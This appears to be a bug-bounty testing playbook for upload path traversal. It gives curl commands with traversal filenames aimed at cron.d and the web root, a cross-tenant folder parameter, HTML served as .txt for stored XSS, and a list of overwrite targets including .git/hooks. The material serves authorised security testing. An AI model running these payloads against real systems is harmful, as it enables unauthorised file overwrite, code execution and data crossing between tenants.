---
name: attack-upload-traversal
description: "Upload path traversal — filename-based directory escape, storage relocation, content-type mismatch on serve, self-XSS-via-upload storage"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - file-upload
  - path-traversal
  - metadata
tech_stack:
  - web
cwe_ids:
  - CWE-434
  - CWE-23
chains_with:
  - attack-file-upload
  - attack-upload-bypass
prerequisites:
  - attack-file-upload
---

# Upload Traversal & Metadata

## Objective

Control over the FILENAME or metadata writes outside the intended directory, overwrites
other files, or sets the served Content-Type. Extension stays benign — the bug is the
path/handling.

## Methodology

### 1. Filename traversal

```bash
# Directory escape (server joins path unsanitized)
curl -F "file=@note.txt;filename=../../etc/cron.d/pwn" https://TARGET/upload
curl -F "file=@note.txt;filename=../../../var/www/html/pwn.txt" https://TARGET/upload
# Windows target (IIS):
curl -F "file=@note.txt;filename=..\\..\\inetpub\\wwwroot\\pwn.txt" https://TARGET/upload
# Absolute path (some libraries take it verbatim):
curl -F "file=@note.txt;filename=/var/www/html/pwn.txt" https://TARGET/upload
```

### 2. Overwrite primitives (impact without RCE)

```text
Overwrite robots.txt / sitemap → index manipulation
Overwrite .git/hooks or user config files → code exec on next trigger
Overwrite OTHER USERS' files (avatar.jpg of a shared id) → identity confusion
Overwrite cache/index files (vendor cache paths) → persistent behavior change
```

### 3. Content-Type mismatch on serve

```bash
# Upload HTML with .txt name if the server serves by SNIFFING content
curl -F "file=@x.html;filename=payload.txt" https://TARGET/upload
curl -sI https://TARGET/files/payload.txt | grep -i content-type
# text/html served = stored XSS without any extension bypass — pair attack-xss-stored
```

### 4. Metadata storage tricks

```text
Unicode/homoglyph filenames (e.g. "\u200bx") bypass filters, break logs
Extremely long names (5KB) → validation substring check fails open
Filename with \r\n → response header injection when reflected in JSON/XML
Reserved names (CON, NUL on Windows) → error paths revealing storage layout
```

### 5. Storage-relocation via API params

```bash
# Some upload APIs accept destination/folder/album params — test traversal THERE too
curl -F "file=@a.txt" -F "folder=../../other-bucket/" https://TARGET/api/upload
# Multi-tenant storage: folder param crossing tenants = data confusion finding
```

## Proof

- File landed at the UNINTENDED path: fetch it (e.g. /pwn.txt at site root) — 200 with
  your content is the proof
- Overwrite: diff the original file before/after
- Serve-mismatch: response headers + browser execution screenshot

## Notes

- Hosted platforms (S3-backed): filenames with `../` are usually harmless there — look
  for traversal in the APP's local temp handling instead
- Combine with attack-upload-bypass when BOTH path and extension must be controlled
